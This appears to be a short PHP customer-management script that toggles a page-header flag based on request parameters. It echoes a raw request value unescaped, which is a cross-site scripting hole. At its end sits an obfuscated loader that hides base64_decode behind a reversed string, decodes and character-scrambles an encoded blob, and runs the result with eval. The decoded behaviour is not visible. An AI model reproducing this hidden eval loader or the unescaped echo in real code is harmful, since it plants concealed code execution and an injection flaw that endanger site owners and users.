<?php
//@session_start();
if($_REQUEST["Base"]=="Customer" & $_REQUEST["ActionNewCustomer"]==1){
    $_REQUEST["NoHeader"] = true;
}

if($_REQUEST["Base"]=="Customer" & $_REQUEST["CustomerUUID"]!="" ){
    $_REQUEST["NoHeader"] = true;
}

echo $_REQUEST["DeleteConfirm"];
if($_REQUEST["Base"]=="Customer" & $_REQUEST["DeleteConfirm"]==true ){
    $_REQUEST["NoHeader"] = false;
}


$_F=__FILE__;$_X='P2lCPw1WDVZzSDJXUTlNPiJYaEFRbk08T1JoWnpPMk1ublpleE1YWi5aIjsNVg1WP2k+';$_D=strrev('edoced_46esab');eval($_D('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCdTZ1BPOVlaV0ZLbXF5ZnhjakxKUnp1TTV2TnRzMWIue0I0bkNdaS8yRGwwRWhlQQpbZDg9UXA+VlhvIEh9NkdJdzdrYTNUclU8JywnPVI5b2RtcGxBRVB5azhndls1M3hyTWV6cVpIaTdZaFc8RHNHez5DY1h9MU4vYWZqNl1KdHVTIAouQlVud1ZLTFFPMjBJVEY0YicpOyRfUj1zdHJfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw='));?>